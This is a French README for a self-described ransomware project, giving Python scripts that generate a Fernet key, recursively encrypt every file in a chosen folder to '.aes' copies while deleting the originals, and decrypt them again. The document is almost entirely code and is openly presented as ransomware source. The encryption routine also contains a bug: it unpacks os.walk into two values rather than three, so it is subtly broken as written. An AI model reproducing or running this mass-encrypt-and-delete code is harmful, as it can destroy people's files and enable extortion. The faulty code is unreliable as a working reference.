# **Projet Ransomware**
## Script de Chiffrement et Déchiffrement de Fichiers
Ce script permet de chiffrer et de déchiffrer les fichiers d’un dossier spécifié à l’aide du module `cryptography.fernet` de Python.



## Génération d’une Clé de Chiffrement
```python
from cryptography.fernet import Fernet

def write_key(key_name): 
    # Générer et sauvegarder la clé de chiffrement
    key = Fernet.generate_key()
    with open(key_name, 'wb') as key_file:
        key_file.write(key)

if __name__ == "__main__":
    write_key("key.key")

```

## Chiffrement de Fichiers
La classe `Encryptor` s’occupe du chiffrement des fichiers.

```python

from cryptography.fernet import Fernet
import os 


class Encryptor:
    def loadkey(self, key_name):
        # Charger la clé de chiffrement
        key = open(key_name,"rb").read()
        return key
    def encrypt(self, path, key):
        # Chiffrer tous les fichiers du dossier spécifié
        for path, files in os.walk(path):
            for file in files:
                file_path = os.path.join(path, file)
                self.encrypt_all_files(file_path, key)


    def encrypt_all_files(self, file, key):
        # Chiffrer les fichiers à l'aide de la clé
        f = Fernet(key)
        encrypted = f.encrypt(open(file, "rb").read())

        # Sauvegarder les nouveaux fichiers cryptés avec une extension ".aes"
        with open(file + ".aes", "wb") as encrypted_file:
            encrypted_file.write(encrypted)

        # Supprimer les docs originaux
        os.remove(file)



if __name__ == "__main__":
    encryptor = Encryptor()

    key = encryptor.loadkey("key.key")

    doc = input("Enter the folder name you wish to encrypt: ")

    encryptor.encrypt(doc,key)

```

## Déchiffrement de Fichiers
La classe `Decryptor` s’occupe du déchiffrement des fichiers.

```python

from cryptography.fernet import Fernet
import os

class Decryptor:
    def loadkey(self, key_name):
        # Charger la clé de chiffrement
        key = open(key_name,"rb").read()
        return key
    
    def decrypt(self, path, key):
        # Déchiffrer tous les fichiers du dossier spécifié
        for path, sub_dirs, files in os.walk(path):
            for file in files:
                file_path = os.path.join(path, file)

                if file_path.endswith(".aes"):
                    self.decrypt_all_files(file_path, key)


    def decrypt_all_files(self, file, key):
        # Déchiffrer les fichiers à l'aide de la clé
        f = Fernet(key)
        decrypted = f.decrypt(open(file, "rb").read())

        # Sauvegarder les nouveaux fichiers décryptés sans l'extension ".aes"
        with open(file.replace(".aes", ""), "wb") as decrypted_file:
            decrypted_file.write(decrypted)

        # Supprimer les docs originaux
        os.remove(file)



if __name__ == "__main__":
    decryptor = Decryptor()

    key = decryptor.loadkey("key.key")

    doc = input("Enter the folder name you wish to decrypt: ")

    decryptor.decrypt(doc,key)

```
